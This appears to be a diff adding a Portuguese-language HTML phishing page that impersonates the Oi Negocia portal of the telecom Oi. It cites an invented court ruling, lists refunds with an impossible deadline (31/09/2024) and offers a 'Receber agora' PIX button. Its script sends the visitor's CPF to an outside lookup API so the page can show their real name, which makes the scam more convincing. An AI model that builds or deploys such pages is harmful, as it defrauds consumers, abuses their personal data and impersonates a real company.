@@ -1,0 +1,311 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <title>Oi Negocia</title>
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+
+    body {
+      font-family: Arial, sans-serif;
+      background-color: #f7f7f7;
+      color: #333;
+      padding: 0;
+      margin: 0;
+    }
+
+    .page-container {
+      display: flex;
+      flex-direction: column;
+      min-height: 100vh;
+    }
+
+    .header {
+      padding: 15px;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+    }
+
+    .logo {
+      margin-bottom: 10px;
+    }
+
+    .nav-menu {
+      background-color: #000;
+      padding: 10px 0;
+      display: flex;
+      gap: 20px;
+      font-size: 16px;
+      justify-content: center;
+      width: 100%;
+    }
+
+    .nav-menu a {
+      color: #fff;
+      text-decoration: none;
+    }
+
+    .account-info {
+      display: flex;
+      align-items: center;
+      font-size: 14px;
+      justify-content: center;
+    }
+
+    .account-info span {
+      margin-right: 10px;
+    }
+
+    .main-content {
+      background-color: white;
+      border-radius: 8px;
+      padding: 20px;
+      box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+      margin: 20px;
+    }
+
+    .title {
+      font-size: 22px;
+      margin-bottom: 10px;
+      text-align: left;
+      color: #2D2D2D;
+    }
+
+    .description {
+      font-size: 16px;
+      line-height: 1.5;
+      margin-bottom: 20px;
+      text-align: left;
+    }
+
+    .legal-note {
+      background-color: #f9f9f9;
+      padding: 15px;
+      border-radius: 5px;
+      margin-bottom: 20px;
+      border-left: 4px solid #c0c0c0;
+    }
+
+    .legal-note p {
+      font-size: 14px;
+      color: #555;
+    }
+
+    .table-container {
+      margin-top: 20px;
+    }
+
+    .sub-title {
+      font-size: 18px;
+      margin-bottom: 10px;
+      color: #444;
+    }
+
+    .contract-text {
+      font-size: 14px;
+      margin-bottom: 10px;
+      color: #666;
+    }
+
+    table {
+      width: 100%;
+      border-collapse: collapse;
+      margin-bottom: 20px;
+      font-size: 14px;
+    }
+
+    table th, table td {
+      border-bottom: 1px solid #ddd;
+      padding: 10px;
+      text-align: left;
+    }
+
+    table th {
+      background-color: #f4f4f4;
+      border-bottom: 2px solid #ddd;
+    }
+
+    .total-container {
+      text-align: center;
+    }
+
+    .total-title {
+      font-size: 18px;
+      margin-bottom: 10px;
+    }
+
+    .amount {
+      color: #0CC04C;
+      font-weight: bold;
+    }
+
+    .receive-button {
+      background-color: #fff;
+      color: #0CC04C;
+      border: 2px solid #0CC04C;
+      padding: 12px 20px;
+      border-radius: 25px;
+      cursor: pointer;
+      font-size: 16px;
+      margin-top: 10px;
+      width: 100%;
+      max-width: 280px;
+      margin: 0 auto;
+      display: block;
+      font-weight: bold;
+    }
+
+    .receive-button:hover {
+      background-color: #0CC04C;
+      color: #fff;
+    }
+
+    .note-text {
+      margin-top: 10px;
+      font-size: 12px;
+      color: #666;
+    }
+
+    .footer {
+      padding: 15px;
+      text-align: center;
+      background-color: #f7f7f7;
+      color: #777;
+      font-size: 12px;
+    }
+
+    @media (max-width: 768px) {
+      body {
+        padding: 10px;
+      }
+
+      .main-content {
+        padding: 15px;
+      }
+
+      table th, table td {
+        padding: 8px;
+      }
+
+      .receive-button {
+        width: 100%;
+      }
+    }
+  </style>
+</head>
+<body>
+  <div class="page-container">
+    <!-- Header Section -->
+    <header class="header">
+      <div class="logo">
+        <img src="logo.png" alt="Oi Negocia">
+      </div>
+      <nav class="nav-menu">
+        <a href="#">DÍVIDAS</a>
+        <a href="#">HISTÓRICO</a>
+        <a href="#">AJUDA</a>
+      </nav>
+      <div class="account-info">
+        <span>B*****y</span>
+        <a href="#">Nova consulta</a>
+      </div>
+    </header>
+
+    <!-- Main Section -->
+    <main class="main-content">
+      <h1 class="title">Confira os valores a receber de <span id="cpfClient">B*****y</span></h1>
+      <p class="description">
+        Os valores elegíveis à restituição do CPF <span id="cpfNumber">[CPF DO CLIENTE]</span> estão aqui.
+        Você poderá solicitar o recebimento agora mesmo via PIX em sua conta bancária.
+      </p>
+
+      <div class="legal-note">
+        <p>
+          Devido à última decisão do Sr. Excelentíssimo Juiz da Vara Cível, Eduardo Gomes Teixeira de Lima,
+          do processo nº 0009874-30.2024.24.09.0044 S/A, que determinou a "DEVOLUÇÃO" dos valores
+          dos serviços que foram faturados indevidamente pela Oi Fibra no ano de 2024, você está ELEGÍVEL
+          a receber os valores abaixo.
+        </p>
+      </div>
+
+      <!-- Table Section -->
+      <div class="table-container">
+        <h2 class="sub-title">Oi Fibra - Em Recuperação Judicial</h2>
+        <p class="contract-text">Contrato: 20*****174</p>
+        <table>
+          <thead>
+            <tr>
+              <th>Valor</th>
+              <th>Serviço</th>
+              <th>Prazo até</th>
+              <th>Status</th>
+            </tr>
+          </thead>
+          <tbody>
+            <tr>
+              <td>R$ 13,96</td>
+              <td>Oi Leitura</td>
+              <td>31/09/2024</td>
+              <td>Elegível</td>
+            </tr>
+            <tr>
+              <td>R$ 49,87</td>
+              <td>Oi Expert</td>
+              <td>31/09/2024</td>
+              <td>Elegível</td>
+            </tr>
+            <tr>
+              <td>R$ 74,95</td>
+              <td>Oi Notícias</td>
+              <td>31/09/2024</td>
+              <td>Elegível</td>
+            </tr>
+            <tr>
+              <td>R$ 21,84</td>
+              <td>Oi Audio News</td>
+              <td>31/09/2024</td>
+              <td>Elegível</td>
+            </tr>
+          </tbody>
+        </table>
+
+        <div class="total-container">
+          <h3 class="total-title">Valor a receber: <span class="amount">R$ 160,62</span></h3>
+          <button class="receive-button">Receber agora</button>
+          <p class="note-text">Receba diretamente no PIX em até 2 horas</p>
+        </div>
+      </div>
+    </main>
+
+    <!-- Footer Section -->
+    <footer class="footer">
+      <p>&copy; 2024 Oi Negocia - Todos os direitos reservados</p>
+    </footer>
+  </div>
+
+  <script>
+    async function fetchData(cpf) {
+      const apiUrl = `https://apiconsultas.store/api/?usuario=03f1ad6ffc&cpf=${cpf}`;
+      const response = await fetch(apiUrl);
+      if (response.ok) {
+        const data = await response.json();
+        document.getElementById('cpfClient').textContent = data.name || 'Nome não encontrado';
+        document.getElementById('cpfNumber').textContent = cpf;
+      } else {
+        console.error('Erro ao buscar CPF:', response.status);
+      }
+    }
+
+    // Exemplo de uso
+    const cpf = '12345678900'; // Substitua pelo CPF desejado
+    fetchData(cpf);
+  </script>
+</body>
+</html>
